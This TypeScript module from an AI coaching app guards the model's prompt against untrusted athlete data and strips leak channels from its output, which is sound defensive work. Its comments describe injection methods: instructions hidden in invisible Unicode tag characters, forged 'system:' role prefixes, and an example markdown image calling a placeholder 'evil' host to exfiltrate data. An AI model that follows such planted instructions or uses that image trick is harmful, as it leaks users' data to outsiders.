/**
 * The trust boundary between stored data and the language model.
 *
 * Everything the coach reads about an athlete - activity names, uploaded file
 * names, free-text goals, notes on previously generated plans - originates
 * outside this application. Anyone who can name a workout can put text there,
 * and a model has no innate concept of a boundary between "material to report
 * on" and "instructions to follow". So we build that boundary out of bytes:
 * fold the lookalikes, delete the invisibles, cap the length, and fence the
 * result inside a marker the writer of the data could not have predicted.
 *
 * This is the outer layer only. The defences that still hold once the model has
 * been talked into something are structural, and they live elsewhere:
 * read-only tools, userId taken from the JWT rather than a tool argument, and
 * zod-validated tool parameters.
 */

import crypto from "crypto";
import { detectInjectionSignals } from "./audit";

/**
 * Encoding artefacts: C0/C1 control characters and the soft hyphen.
 *
 * These turn up honestly - a double-encoded UTF-8 filename ("UciÄ…ty.fit")
 * produces C1 bytes - so they are stripped but NOT treated as evidence of an
 * attack. Alerting on them would bury the real signals in noise from every
 * mis-encoded upload.
 */
const CONTROL_CHARS = /[\u0000-\u0008\u000B-\u001F\u007F-\u009F\u00AD]/gu;

/**
 * Characters whose only purpose is hiding text from whoever reads it.
 *
 * Zero-width spaces, bidirectional overrides, and the tag block
 * (U+E0000-E007F), which encodes the whole of ASCII as invisible glyphs - so a
 * paragraph of instructions can hide inside a name that renders as nothing more
 * than "Morning Run". Unlike the controls above, these essentially never occur
 * by accident in an activity name, and their presence IS the signal: the hidden
 * text is gone by the time any content detector could read it.
 */
const HIDDEN_TEXT_CHARS = /[\u061C\u180E\u200B-\u200F\u202A-\u202E\u2060-\u2064\u2066-\u2069\uFEFF]|[\u{E0000}-\u{E007F}]/gu;

/** Sequences that could close a fence or imitate a chat-template delimiter. */
const STRUCTURAL = /`+|<\|[^|>]*\|>/g;

/** Our own fence markers, so untrusted text can never forge or close one. */
const FENCE_MARKER = /<<<(?:DATA|END):[0-9a-f]{16}>>>/g;

/** "system:", "assistant:" at the start of a line - a forged turn boundary. */
const ROLE_PREFIX = /^[ \t]*(system|assistant|developer|tool)[ \t]*:/gim;

export interface SanitizeOptions {
  maxLength: number;
  /** Keep newlines (goals, plan notes) or flatten everything (names). */
  allowNewlines?: boolean;
  fallback?: string;
}

export interface SanitizeResult {
  text: string;
  /** True when something was removed that an honest value would not contain. */
  suspicious: boolean;
  signals: string[];
}

/**
 * Field presets, so nobody invents a new cap at a call site and quietly widens
 * the boundary.
 */
export const FIELD = {
  activityName: { maxLength: 80, fallback: "(unnamed activity)" },
  fileName: { maxLength: 100, fallback: "(unnamed file)" },
  profileGoal: { maxLength: 200, fallback: "" },
  eventName: { maxLength: 80, fallback: "" },
  planText: { maxLength: 400, allowNewlines: true, fallback: "" },
  historyTurn: { maxLength: 2_000, allowNewlines: true, fallback: "" },
  userMessage: { maxLength: 4_000, allowNewlines: true, fallback: "" },
} as const satisfies Record<string, SanitizeOptions>;

/**
 * Normalise and defang one untrusted string on its way into a prompt.
 *
 * Truncating rather than rejecting is deliberate: a silly activity name should
 * never be the reason an athlete does not get an answer.
 */
export const sanitizeUntrusted = (
  raw: unknown,
  options: SanitizeOptions
): SanitizeResult => {
  const signals: string[] = [];

  if (typeof raw !== "string" || raw.length === 0) {
    return { text: options.fallback ?? "", suspicious: false, signals };
  }

  // Cap before doing any work, so a multi-megabyte value cannot turn the
  // replacements below into a denial of service.
  let text = raw.slice(0, options.maxLength * 8);

  // NFKC first. It folds fullwidth and compatibility lookalikes down to plain
  // ASCII, which means the detector further down sees the same string the model
  // would read rather than a decorated variant that slips past every pattern.
  text = text.normalize("NFKC");

  const beforeControls = text.length;
  text = text.replace(CONTROL_CHARS, "");
  if (text.length !== beforeControls) {
    signals.push("control_chars");
  }

  const beforeHidden = text.length;
  text = text.replace(HIDDEN_TEXT_CHARS, "");
  if (text.length !== beforeHidden) {
    signals.push("hidden_text_chars");
  }

  const beforeStructural = text.length;
  text = text.replace(FENCE_MARKER, " ").replace(STRUCTURAL, " ");
  if (text.length !== beforeStructural) {
    signals.push("structural_chars");
  }

  // Leave the words readable - the coach should be able to quote an odd name
  // back to the athlete - but break the colon that makes it look like a role.
  if (ROLE_PREFIX.test(text)) {
    signals.push("role_prefix");
  }
  // Reset lastIndex: ROLE_PREFIX is a /g/ regex, and .test() advances it.
  ROLE_PREFIX.lastIndex = 0;
  text = text.replace(ROLE_PREFIX, (match) => match.replace(":", " -"));

  text = options.allowNewlines
    ? text.replace(/\r\n?/g, "\n").replace(/\n{3,}/g, "\n\n").replace(/[^\S\n]{2,}/g, " ")
    : text.replace(/\s+/g, " ");

  text = text.trim();

  if (text.length > options.maxLength) {
    text = `${text.slice(0, options.maxLength - 1).trimEnd()}…`;
    signals.push("truncated");
  }

  signals.push(...detectInjectionSignals(text));

  return {
    text: text.length > 0 ? text : options.fallback ?? "",
    // Truncation and stray control bytes are ordinary facts of life in this
    // data; anything else means someone was trying something.
    suspicious: signals.some(
      (signal) => signal !== "truncated" && signal !== "control_chars"
    ),
    signals,
  };
};

/** Convenience for the common case where only the cleaned string is wanted. */
export const sanitizeText = (raw: unknown, options: SanitizeOptions): string =>
  sanitizeUntrusted(raw, options).text;

// --- Fencing ---------------------------------------------------------------

/**
 * A per-request nonce. The system prompt names it, data blocks are wrapped in
 * it, and the sanitiser strips anything that looks like a marker out of
 * untrusted text. Someone who cannot see the nonce cannot close the block; the
 * stripping covers the case where they somehow could.
 */
export const createFenceNonce = (): string =>
  crypto.randomBytes(8).toString("hex");

export const fenceData = (nonce: string, label: string, body: string): string =>
  `<<<DATA:${nonce}>>> ${label}\n${body}\n<<<END:${nonce}>>>`;

// --- Output side -----------------------------------------------------------

const MARKDOWN_IMAGE = /!\[[^\]]*\]\([^)]*\)/g;
const MARKDOWN_LINK = /\[([^\]]*)\]\(\s*([^)\s]+)(?:\s+"[^"]*")?\s*\)/g;
const REFERENCE_DEF = /^[ \t]*\[[^\]]+\]:\s*\S+.*$/gm;
const AUTOLINK = /<((?:https?|ftp):\/\/[^>\s]+)>/gi;
const HTML_TAG = /<\/?[a-zA-Z][^>]*>/g;

export interface StripMediaResult {
  text: string;
  /** What was taken out, for the audit log. */
  removed: string[];
}

/**
 * Remove the exfiltration channels from model output before it is persisted.
 *
 * A markdown image is a zero-click GET: an injected instruction to end every
 * reply with `![](https://evil/?d=<data>)` leaks on every future render, in
 * every client, forever. Neutralising at write time means the database never
 * holds a live payload, and anything that later reads that row - a digest
 * email, a mobile client - inherits the fix without knowing it needed one.
 *
 * External links survive as plain text rather than vanishing: the athlete can
 * still read where the coach was pointing, but nothing loads and nothing is one
 * stray click away. The renderer downgrades them again, and a CSP catches what
 * both layers miss.
 */
export const stripMarkdownMedia = (markdown: string): StripMediaResult => {
  const removed: string[] = [];

  let text = markdown.replace(MARKDOWN_IMAGE, () => {
    removed.push("image");
    return "";
  });

  text = text.replace(REFERENCE_DEF, () => {
    removed.push("reference_definition");
    return "";
  });

  text = text.replace(MARKDOWN_LINK, (_match, label: string, href: string) => {
    // Relative links can only point back into this app, so they stay live.
    if (href.startsWith("/")) {
      return `[${label}](${href})`;
    }
    removed.push("link");
    return label ? `${label} (${href})` : href;
  });

  text = text.replace(AUTOLINK, (_match, href: string) => {
    removed.push("autolink");
    return href;
  });

  text = text.replace(HTML_TAG, () => {
    removed.push("html_tag");
    return "";
  });

  return { text: text.trim(), removed };
};
